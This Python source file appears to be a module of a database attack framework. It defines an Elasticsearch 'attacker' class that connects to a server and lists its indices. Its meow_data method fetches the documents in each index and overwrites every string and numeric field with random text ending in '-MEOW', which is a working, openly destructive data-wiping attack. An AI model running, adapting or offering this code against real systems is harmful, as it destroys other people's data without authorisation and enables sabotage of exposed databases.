import random
import string
import requests
from core.base_attacker import BaseAttacker

class ElasticsearchAttacker(BaseAttacker):
    """
    Elasticsearch implementation of the BaseAttacker.
    """
    
    @classmethod
    def get_service_name(cls):
        return "elasticsearch"
    
    @classmethod
    def get_default_port(cls):
        return 9200
    
    def connect(self):
        """
        Connect to Elasticsearch server.
        """
        self.base_url = f"http://{self.host}:{self.port}"
        
        # Create session for requests
        self.session = requests.Session()
        
        # Add authentication if provided
        if self.username and self.password:
            self.session.auth = (self.username, self.password)
        
        try:
            # Test connection with a health check
            response = self.session.get(f"{self.base_url}/_cluster/health")
            if response.status_code != 200:
                raise Exception(f"Failed to connect: HTTP {response.status_code}")
                
            self.logger.info("Successfully connected to Elasticsearch")
            return self.session
        except Exception as e:
            self.logger.error(f"Failed to connect to Elasticsearch: {str(e)}")
            raise
    
    def get_databases(self):
        """
        In Elasticsearch, indices are the equivalent of databases.
        Get list of indices, excluding system indices.
        """
        response = self.session.get(f"{self.base_url}/_cat/indices?format=json")
        if response.status_code != 200:
            raise Exception(f"Failed to get indices: HTTP {response.status_code}")
            
        indices = response.json()
        # Filter out system indices (starting with .)
        return [index['index'] for index in indices if not index['index'].startswith('.')]
    
    def get_collections(self, index):
        """
        In Elasticsearch, mappings are the closest equivalent to collections/tables.
        However, an index typically has just one mapping, so we'll return a single item.
        """
        return [index]  # Return the index name as the only "collection"
    
    def random_alphanumeric(self, length=10):
        """
        Generate a random alphanumeric string.
        """
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def meow_data(self, index, collection):
        """
        Execute the MEOW attack on the specified index.
        For Elasticsearch, we'll update all documents in the index.
        """
        # First, get the mapping to understand the fields
        response = self.session.get(f"{self.base_url}/{index}/_mapping")
        if response.status_code != 200:
            raise Exception(f"Failed to get mapping: HTTP {response.status_code}")
            
        # Get all documents
        response = self.session.get(f"{self.base_url}/{index}/_search?size=10000")
        if response.status_code != 200:
            raise Exception(f"Failed to get documents: HTTP {response.status_code}")
            
        results = response.json()
        hits = results.get('hits', {}).get('hits', [])
        modified_count = 0
        
        for hit in hits:
            doc_id = hit['_id']
            source = hit['_source']
            updated_doc = {}
            
            for key, value in source.items():
                if isinstance(value, (str, int, float)):
                    random_chars = self.random_alphanumeric()
                    new_value = f"{random_chars}-MEOW"
                    updated_doc[key] = new_value
                else:
                    updated_doc[key] = value
            
            # Update the document
            update_url = f"{self.base_url}/{index}/_doc/{doc_id}"
            response = self.session.put(update_url, json=updated_doc)
            
            if response.status_code in (200, 201):
                modified_count += 1
        
        self.logger.info(f"Modified {modified_count} documents in {index}")
        return modified_count
    
    def close(self):
        """
        Close the Elasticsearch session.
        """
        if hasattr(self, 'session'):
            self.session.close()
            self.logger.info("Elasticsearch session closed")